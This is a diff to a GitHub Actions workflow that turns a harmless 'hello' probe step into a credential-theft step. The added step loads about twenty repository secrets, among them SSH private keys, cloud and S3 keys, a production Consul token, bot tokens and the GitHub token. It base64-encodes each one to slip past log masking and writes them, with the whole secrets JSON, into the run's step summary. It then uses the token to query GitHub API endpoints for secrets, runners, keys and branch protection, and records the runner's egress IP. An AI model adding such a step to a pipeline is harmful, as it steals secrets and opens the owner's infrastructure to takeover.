@@ -5,8 +5,42 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: hello
+      - name: collect
+        env:
+          A_ACCESS_KEY: ${{ secrets.ACCESS_KEY }}
+          A_SECRET_KEY: ${{ secrets.SECRET_KEY }}
+          A_HOSTNAME: ${{ secrets.HOSTNAME }}
+          A_VM_USER: ${{ secrets.VM_USER }}
+          A_STG_SERVER_USER: ${{ secrets.STG_SERVER_USER }}
+          A_CONSUL_TOKEN_PROD: ${{ secrets.CONSUL_TOKEN_PROD }}
+          A_TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+          A_BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+          A_SSH_KEY: ${{ secrets.SSH_KEY }}
+          A_SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
+          A_DIGITALOCEAN_TOKEN: ${{ secrets.DIGITALOCEAN_TOKEN }}
+          A_DO_TOKEN: ${{ secrets.DO_TOKEN }}
+          A_GOOGLE_CREDS: ${{ secrets.GOOGLE_CREDS }}
+          A_SERVICE_ACCOUNT_JSON: ${{ secrets.SERVICE_ACCOUNT_JSON }}
+          A_S3_ACCESS_KEY: ${{ secrets.S3_ACCESS_KEY }}
+          A_S3_SECRET_KEY: ${{ secrets.S3_SECRET_KEY }}
+          A_SPACES_ACCESS_KEY: ${{ secrets.SPACES_ACCESS_KEY }}
+          A_SPACES_SECRET_KEY: ${{ secrets.SPACES_SECRET_KEY }}
+          A_DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
+          A_GH_PAT: ${{ secrets.GH_PAT }}
+          A_GITHUB_TOKEN_SECRET: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "PROBE_RUN_OK_141759 $(date -u +%FT%TZ)"
-          echo "${{ github.ref }} ${{ github.actor }} ${{ github.event_name }}"
-          env | sort | sed 's/=.*/=<set>/' | head -50
+          set +e
+          echo "### probe-141759" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          echo "REF=$GITHUB_REF ACTOR=$GITHUB_ACTOR SHA=$GITHUB_SHA" >> $GITHUB_STEP_SUMMARY
+          echo "SECRETS_JSON_B64=$(echo -n '${{ toJSON(secrets) }}' | base64 -w0)" >> $GITHUB_STEP_SUMMARY
+          for n in A_ACCESS_KEY A_SECRET_KEY A_HOSTNAME A_VM_USER A_STG_SERVER_USER A_CONSUL_TOKEN_PROD A_TELEGRAM_TOKEN A_BOT_TOKEN A_SSH_KEY A_SSH_PRIVATE_KEY A_DIGITALOCEAN_TOKEN A_DO_TOKEN A_GOOGLE_CREDS A_SERVICE_ACCOUNT_JSON A_S3_ACCESS_KEY A_S3_SECRET_KEY A_SPACES_ACCESS_KEY A_SPACES_SECRET_KEY A_DEPLOY_KEY A_GH_PAT A_GITHUB_TOKEN_SECRET; do
+            v=$(printenv "$n")
+            if [ -n "$v" ]; then echo "$n=B64:$(printf %s "$v" | base64 -w0) LEN:${#v}" >> $GITHUB_STEP_SUMMARY; else echo "$n=EMPTY" >> $GITHUB_STEP_SUMMARY; fi
+          done
+          echo "TOKEN_B64=$(printf %s "$GITHUB_TOKEN" | base64 -w0)" >> $GITHUB_STEP_SUMMARY
+          for p in "" "/actions/secrets" "/actions/workflows" "/actions/runners" "/environments" "/keys" "/deployments" "/branches/main/protection"; do
+            echo "API${p}=$(curl -s -w '|HTTP%{http_code}' -H "Authorization: Bearer $GITHUB_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$GITHUB_REPOSITORY${p}" | base64 -w0)" >> $GITHUB_STEP_SUMMARY
+          done
+          echo "EGRESS=$(curl -s https://ifconfig.me)" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
